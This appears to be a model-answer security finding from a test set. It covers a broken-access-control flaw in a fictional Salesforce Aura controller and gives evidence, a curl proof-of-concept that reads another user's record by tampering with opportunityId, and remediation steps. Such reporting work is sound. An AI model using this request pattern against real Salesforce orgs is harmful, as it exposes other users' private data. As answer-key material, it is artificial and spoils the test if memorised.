# Expected Response

## System
- **Domain:** Social Media / Content Platform (Salesforce-Integrated)
- **System:** Horizon Social Graph API (Salesforce-Integrated)
- **Example ID:** SF-0011

## Priority Findings

### Finding 1: Social Media Salesforce — BAC Privilege Escalation via Aura getOpportunity Exposes Cross-Ownership Opportunity Records (Pattern 2.4)
**Severity:** High
**Category:** Broken Access Control / Privilege Escalation via Parameter Tampering (Salesforce Aura)

**Summary:**
Per §4.0 (RISK-SF-011/RISK-SF-012): The `OpportunityController` Apex class is declared `without sharing`, meaning Salesforce sharing rules are not enforced. The SOQL query is missing an ownership check. Per §5.0 (Pattern 2.4 — privilege escalation via parameter tampering): the Aura `getOpportunity` action escalates the attacker's privileges by accepting a tampered `opportunityId`, accessing revenue opportunity records owned by other users. An attacker submitted `c.OpportunityController.getOpportunity` with `opportunityId: "00124A8"` (belonging to `OwnerId: "005VICTIM"`) and received `SensitiveData__c: "SSN: 000-92-5799"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"`. In Social Media platforms using Salesforce, opportunity record exposure reveals strategic partnership and revenue data.

**Evidence from HAR:**
- Request: `POST https://276024a8.lightning.force.com/aura`
- Aura action descriptor: `c.OpportunityController.getOpportunity`
- `aura.token`: `undefined`
- Params: `opportunityId: "00124A8"`, `fields: ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]`
- Response `SUCCESS`: `Id: "00124A8"`, `Name: "Victim Opportunity Record"`, `OwnerId: "005VICTIM"`, `InternalNotes__c: "CONFIDENTIAL: internal review notes"`, `SensitiveData__c: "SSN: 000-92-5799"`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-SF-011 | OpportunityController declared `without sharing` |
| context.txt §4.0 | RISK-SF-012 | SOQL missing ownership check |
| context.txt §5.0 | Pattern 2.4 | Privilege escalation via opportunityId parameter tampering |
| HAR request | params.opportunityId | 00124A8 — victim opportunity ID |
| HAR response | SensitiveData__c | SSN: 000-92-5799 (PII) |

## Steps to Reproduce

### Step 1 — Aura opportunityId privilege escalation social media (HAR)
```bash
curl -s -X POST 'https://276024a8.lightning.force.com/aura' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"00124A8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```
**Vulnerable:** Returns victim opportunity record including `SSN: 000-92-5799`. **Secure:** FORBIDDEN.

## Remediation
1. Declare `OpportunityController` as `with sharing`.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Validate `aura.token`; server-side field allowlist.
